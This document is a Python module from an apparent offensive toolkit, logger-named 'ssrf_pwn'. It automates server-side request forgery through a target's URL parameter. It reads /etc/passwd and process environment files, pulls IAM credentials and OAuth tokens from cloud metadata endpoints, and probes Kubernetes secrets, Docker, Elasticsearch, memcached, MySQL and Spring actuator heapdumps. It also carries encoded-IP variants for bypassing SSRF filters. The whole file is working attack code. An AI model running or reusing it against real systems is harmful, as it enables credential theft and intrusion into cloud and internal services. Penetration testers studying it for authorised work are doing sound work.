import re, json
from typing import Optional, Dict, List
import requests

from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("ssrf_pwn")

SSRF_EXPLOIT_URLS = [
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/info",
    "http://127.0.0.1:8080/_env",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/",
    "file:///proc/self/environ",
]

CLOUD_EVIDENCE = {
    "aws": [r"ami-id", r"instance-id", r"security-credentials", r"AWS_"],
    "gcp": [r"google", r"computeMetadata"],
    "azure": [r"azure", r"vmId", r"osType"],
}

CLOUD_META = {
    "aws": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "gcp": [
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "do": [
        "http://169.254.169.254/metadata/v1.json",
    ],
    "alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
}

SSRF_BYPASS_VARIANTS = [
    ("169.254.169.254", "http://%s/latest/meta-data/"),
    ("0x.a9.0xfe.0xa9", "http://%s/latest/meta-data/"),
    ("0xa9fea9fe", "http://%s/latest/meta-data/"),
    ("2852039166", "http://%s/latest/meta-data/"),
    ("0251.0376.0251.0376", "http://%s/latest/meta-data/"),
    ("127.0.0.1", "http://%s/latest/meta-data/"),
    ("localhost", "http://%s/latest/meta-data/"),
    ("[::ffff:169.254.169.254]", "http://%s/latest/meta-data/"),
    ("127.0.0.2", "http://%s/latest/meta-data/"),
    ("0.0.0.0", "http://%s/latest/meta-data/"),
    ("2130706433", "http://%s/latest/meta-data/"),
    ("0x7f000001", "http://%s/latest/meta-data/"),
]


def _build_url(url: str, param: str, target: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}{param}={target}"


def check_file_read(url: str, param: str, sess=None, timeout=10.0) -> list:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    results = []
    for target in SSRF_EXPLOIT_URLS:
        if not target.startswith("file"):
            continue
        try:
            r = sess.get(_build_url(url, param, target), timeout=timeout)
            if len(r.text) > 50:
                results.append({"target": target[:30], "size": len(r.text), "preview": r.text[:100]})
        except Exception as e:
            logger.debug("file_read %s: %s", target[:20], e)
    return results


def check_cloud_metadata(url: str, param: str, sess=None, timeout=10.0) -> Dict:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl
    result = {}
    for target in SSRF_EXPLOIT_URLS:
        if not target.startswith("http://169") and not target.startswith("http://metadata"):
            continue
        try:
            r = sess.get(_build_url(url, param, target), timeout=timeout)
            if len(r.text) > 20:
                for cloud, patterns in CLOUD_EVIDENCE.items():
                    for pat in patterns:
                        if re.search(pat, r.text, re.IGNORECASE):
                            result[cloud] = {"url": target[:30], "size": len(r.text),
                                              "preview": r.text[:150]}
                            break
        except Exception as e:
            logger.debug("cloud_meta %s: %s", target[:20], e)
    return result


# ---------------------------------------------------------------------------
# Comprehensive SSRFLateral engine (formerly ssrf_lateral)
# ---------------------------------------------------------------------------

class SSRFLateral:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.timeout = timeout

    def port_scan(self, url: str, param: str, ports: List[int] = None) -> list:
        if ports is None:
            ports = [22, 80, 443, 3306, 6379, 8080, 9200, 27017, 11211, 5000]
        results = []
        for port in ports:
            target = f"http://127.0.0.1:{port}/"
            try:
                r = self.sess.get(_build_url(url, param, target), timeout=self.timeout)
                if r.status_code not in (502, 504, 0) and len(r.text) > 10:
                    results.append({"port": port, "service": target,
                                    "status": r.status_code, "size": len(r.text)})
            except Exception as e:
                logger.debug("port_scan port %d: %s", port, e)
        return results

    def exploit_aws_imdsv2(self, url: str, param: str) -> Dict:
        result = {}
        try:
            resp = self.sess.put(
                "http://169.254.169.254/latest/api/token",
                headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                timeout=self.timeout
            )
            if resp.status_code == 200:
                token = resp.text.strip()
                result["imdsv2_token"] = token[:20]
                for meta_url in CLOUD_META["aws"]:
                    try:
                        r = self.sess.get(meta_url,
                                          headers={"X-aws-ec2-metadata-token": token},
                                          timeout=self.timeout)
                        if r.status_code == 200 and len(r.text) > 20:
                            result[meta_url[:40]] = r.text[:200]
                    except Exception as e:
                        logger.debug("imdsv2 inner %s: %s", meta_url[:30], e)
        except Exception as e:
            logger.debug("imdsv2 outer: %s", e)
        return result

    def exploit_kubernetes(self, url: str, param: str) -> Dict:
        result = {}
        k8s_paths = [
            "http://kubernetes.default.svc/api/v1/namespaces/default/pods",
            "http://kubernetes.default.svc/api/v1/nodes",
            "http://kubernetes.default.svc/api/v1/secrets",
            "http://10.0.0.1:443/api/v1/nodes",
            "http://10.96.0.1:443/api/v1/nodes",
        ]
        for k8s_url in k8s_paths:
            try:
                r = self.sess.get(_build_url(url, param, k8s_url), timeout=self.timeout)
                if r.status_code in (200, 403) and len(r.text) > 50:
                    result[k8s_url] = {"status": r.status_code, "size": len(r.text)}
            except Exception as e:
                logger.debug("k8s %s: %s", k8s_url, e)
        return result

    def exploit_docker(self, url: str, param: str) -> Dict:
        result = {}
        docker_urls = [
            "http://127.0.0.1:2375/containers/json",
            "http://127.0.0.1:2376/containers/json",
            "http://127.0.0.1:2375/version",
            "http://127.0.0.1:2375/info",
            "unix:///var/run/docker.sock",
        ]
        for dkr_url in docker_urls:
            try:
                r = self.sess.get(_build_url(url, param, dkr_url), timeout=self.timeout)
                if r.status_code == 200 and len(r.text) > 20:
                    result[dkr_url] = {"status": r.status_code, "size": len(r.text)}
            except Exception as e:
                logger.debug("docker %s: %s", dkr_url, e)
        return result

    def exploit_elasticsearch(self, url: str, param: str) -> Dict:
        result = {}
        es_urls = [
            "http://127.0.0.1:9200/",
            "http://127.0.0.1:9200/_cat/indices?v",
            "http://127.0.0.1:9200/_search?pretty&size=5",
        ]
        for es_url in es_urls:
            try:
                r = self.sess.get(_build_url(url, param, es_url), timeout=self.timeout)
                if r.status_code == 200:
                    try:
                        j = r.json()
                        result[es_url] = list(j.keys())[:5] if isinstance(j, dict) else "json"
                    except Exception:
                        result[es_url] = r.text[:100]
            except Exception as e:
                logger.debug("es %s: %s", es_url, e)
        return result

    def exploit_memcached(self, url: str, param: str) -> Dict:
        result = {}
        try:
            gopher_url = "gopher://127.0.0.1:11211/_stats"
            r = self.sess.get(_build_url(url, param, gopher_url), timeout=self.timeout)
            if len(r.text) > 10:
                result["memcached"] = r.text[:200]
        except Exception as e:
            logger.debug("memcached: %s", e)
        return result

    def exploit_mysql_ssrf(self, url: str, param: str) -> Dict:
        result = {}
        try:
            gopher_url = "gopher://127.0.0.1:3306/_" + "%00%00%00%0a" + "SELECT 1"
            r = self.sess.get(_build_url(url, param, gopher_url), timeout=self.timeout)
            if len(r.text) > 10:
                result["mysql_probe"] = r.text[:200]
        except Exception as e:
            logger.debug("mysql ssrf: %s", e)
        return result

    def exploit_spring_actuator(self, url: str, param: str) -> Dict:
        result = {}
        spring_paths = [
            "http://127.0.0.1:8080/actuator",
            "http://127.0.0.1:8080/actuator/env",
            "http://127.0.0.1:8080/actuator/health",
            "http://127.0.0.1:8080/actuator/beans",
            "http://127.0.0.1:8080/actuator/heapdump",
        ]
        for sp in spring_paths:
            try:
                r = self.sess.get(_build_url(url, param, sp), timeout=self.timeout)
                if r.status_code == 200 and len(r.text) > 20:
                    result[sp] = r.text[:100]
            except Exception as e:
                logger.debug("spring %s: %s", sp, e)
        return result

    def bypass_filter_variants(self, url: str, param: str) -> List[Dict]:
        results = []
        for ip, tpl in SSRF_BYPASS_VARIANTS:
            try:
                test_url = tpl % ip
                r = self.sess.get(_build_url(url, param, test_url), timeout=self.timeout)
                if len(r.text) > 50:
                    results.append({"variant": ip, "size": len(r.text)})
            except Exception as e:
                logger.debug("bypass variant %s: %s", ip, e)
        return results

    def run(self, url: str, param: str) -> Dict:
        result = {
            "port_scan": self.port_scan(url, param),
            "cloud_metadata": {},
            "kubernetes": self.exploit_kubernetes(url, param),
            "docker": self.exploit_docker(url, param),
            "elasticsearch": self.exploit_elasticsearch(url, param),
            "memcached": self.exploit_memcached(url, param),
            "mysql": self.exploit_mysql_ssrf(url, param),
            "spring_actuator": self.exploit_spring_actuator(url, param),
            "bypass_variants": self.bypass_filter_variants(url, param),
        }
        for cloud in CLOUD_META:
            for meta_url in CLOUD_META[cloud]:
                try:
                    r = self.sess.get(_build_url(url, param, meta_url), timeout=self.timeout)
                    if len(r.text) > 20:
                        if cloud not in result["cloud_metadata"]:
                            result["cloud_metadata"][cloud] = {}
                        result["cloud_metadata"][cloud][meta_url[:50]] = r.text[:200]
                except Exception as e:
                    logger.debug("cloud meta %s: %s", meta_url[:40], e)
        return result


# ---------------------------------------------------------------------------
# Unified entry points
# ---------------------------------------------------------------------------

def run(url: str, param: str, sess: Optional[requests.Session] = None,
        timeout: float = 10.0) -> Dict:
    ssrf = SSRFLateral(sess, timeout)
    return ssrf.run(url, param)


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session(); sess.verify = settings.verify_ssl

    lateral = SSRFLateral(sess, timeout)
    lateral_result = lateral.run(url, param)
    file_reads = check_file_read(url, param, sess, timeout)

    has_file_reads = len(file_reads) > 0
    has_cloud = any(len(v) > 0 for v in lateral_result.get("cloud_metadata", {}).values())
    has_services = any(len(v) > 0 for k, v in lateral_result.items()
                       if k not in ("cloud_metadata",) and isinstance(v, list))

    result = {
        "vulnerable": has_file_reads or has_cloud or has_services,
        "files": file_reads,
        "cloud_metadata": lateral_result.get("cloud_metadata", {}),
        "internal_services": {
            k: v for k, v in lateral_result.items()
            if k not in ("cloud_metadata",) and isinstance(v, list) and len(v) > 0
        },
        "findings": [],
    }
    if has_file_reads:
        result["findings"].append(f"ssrf file read: {len(file_reads)} files")
    if has_cloud:
        result["findings"].append(f"ssrf cloud metadata: {list(lateral_result['cloud_metadata'].keys())}")
    if has_services:
        result["findings"].append(f"ssrf internal services: {len(result['internal_services'])} types")

    return result
